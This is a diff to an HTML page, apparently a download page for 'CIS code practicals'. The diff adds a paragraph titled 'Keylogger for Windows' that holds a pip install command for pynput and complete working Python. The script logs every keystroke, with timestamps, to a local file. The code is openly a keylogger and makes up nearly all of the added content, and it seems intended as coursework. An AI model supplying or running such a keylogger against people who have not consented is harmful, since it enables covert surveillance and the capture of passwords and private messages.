@@ -9,6 +9,18 @@
 </head>
 <body>
 <p> Download the PDF</p>
+<p>Keylogger for Windows  Download some python module pynput
+py –m pip install pynput    
+Code: - 
+from pynput.keyboard import Key, Listener
+import logging 
+log_dir = "" 
+logging.basicConfig(filename=(log_dir+"key_log.txt"), level=logging.DEBUG, 
+format='%(asctime)s:%(message)s:') 
+def on_press(key):
+    logging.info(str(key)) 
+with Listener(on_press=on_press) as listener:
+    listener.join() </p>
 <br>
 <br>
 <a href="CIS-practicals.pdf" download>CIS code practicals</a>
